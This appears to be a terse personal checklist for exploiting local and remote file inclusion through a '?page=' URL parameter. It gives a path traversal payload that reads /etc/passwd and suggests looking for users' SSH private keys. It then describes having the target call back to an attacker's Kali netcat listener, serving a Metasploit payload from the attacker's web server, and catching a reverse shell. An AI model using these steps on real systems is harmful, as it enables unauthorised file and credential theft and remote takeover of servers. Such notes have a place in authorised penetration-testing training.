# Initial inspection

1. Does the URL have a `?page=<whatever>` at the end?
   
   a. Yes then continue

   b. No then stop

# Attempt LFI 
 
1. cat a file every user should have access to?
   
   a. Something like this `<url>/?page=../../../../../../../../../../../etc/passwd`

   b. If this worked then LFI is good

   c. If this didnt work, attempt url encoding it

   d. If this didnt work, move on to RFI

3. Get users that have home directories

   a. Good starting point is look for `.ssh/id.rsa` file in attempt to get ssh access

# Attempt RFI 

1. set up enviroment

   a. Create nc listener on kali

   b. use website to call back to nc listener `<url>/?page=http://<kali ip>:<port>/`

2. examine nc output

         i. if the request looks like `GET / HTTP/1.0` then the webpage is not looking for any file type inparticulat

         ii. if the tequest looks like `GET /<file name> HTTP/1.0` then it is looking for a file with that file name

   a. for request like `GET / HTTP/1.0`:

         i. create payload with msfconsol and start a webserver in that location

         ii. creat a listener on the kali machine listening for the call back
   
         iii. call the file through the url `<url>/?page=http://<kali webserver>/<file>`

         iv. wait for the call back

   b. for request like `GET /<file name> HTTP/1.0`:

         i. create payload with msfconsol and with the name and file type of the one that nc returned

         ii. start a webserver in that location of shell

         iii. creat a listener on the kali machine listening for the call back

         iv. call the file through the url `<url>/?page=http://<kali webserver>/<file>`

         v. wait for the call back

      

